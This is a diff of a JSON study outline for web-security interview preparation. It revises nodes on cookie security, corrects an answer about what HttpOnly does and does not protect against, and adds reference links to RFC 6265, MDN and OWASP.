-              "notes": "Answer: No, HttpOnly only protects against XSS. Use SameSite or CSRF tokens for CSRF protection.",
+              "markdown": "Answer: No. The browser still sends the cookie. Use SameSite or a CSRF token. HttpOnly does not stop XSS either. It only blocks `document.cookie`.",
+              "notes": "Answer: No. The browser still sends the cookie. Use SameSite or a CSRF token. HttpOnly does not stop XSS either. It only blocks document.cookie.",
               "kind": "topic",
               "level": 3,
               "children": [],
-              "blurb": "Answer: No, HttpOnly only protects against XSS.",
+              "blurb": "",
               "expanded": false
             }
           ],
@@ -7135,9 +7191,9 @@
           "expanded": false
         },
         {
-          "id": "nae7fda3cb0f4a0d",
-          "title": "Depth: Interview follow-ups \u2014 Cookie Security",
-          "markdown": "**Authoritative references:** [RFC 6265](https://www.rfc-editor.org/rfc/rfc6265) (HTTP cookies); [SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) (MDN-browser behavior); [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html).\n\n**Follow-ups:**",
+          "id": "n680cb7ba71b1756",
+          "title": "Depth: Interview follow-ups - Cookie Security",
+          "markdown": "Authoritative references: [RFC 6265](https://www.rfc-editor.org/rfc/rfc6265) (HTTP cookies); [SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) (MDN-browser behavior); [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html).\n\nFollow-ups:",
           "notes": "Authoritative references: RFC 6265 (HTTP cookies); SameSite cookies (MDN-browser behavior); OWASP Session Management.\n\nFollow-ups:",
           "kind": "topic",
           "level": 2,
@@ -7180,9 +7236,9 @@
           "expanded": false
         },
         {
-          "id": "n7725437d71fd7a3",
-          "title": "Depth: Interview follow-ups \u2014 HttpOnly & Secure Cookies",
-          "markdown": "**Authoritative references:** [MDN Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie); [OWASP Session Management CS](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html); [SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) (browser enforcement).\n\n**Follow-ups:**",
+          "id": "n38689999e60d7e9",
+          "title": "Depth: Interview follow-ups - HttpOnly & Secure Cookies",
+          "markdown": "Authoritative references: [MDN Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie); [OWASP Session Management CS](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html); [SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) (browser enforcement).\n\nFollow-ups:",
           "notes": "Authoritative references: MDN Set-Cookie; OWASP Session Management CS; SameSite (browser enforcement).\n\nFollow-ups:",
           "kind": "topic",
           "level": 2,
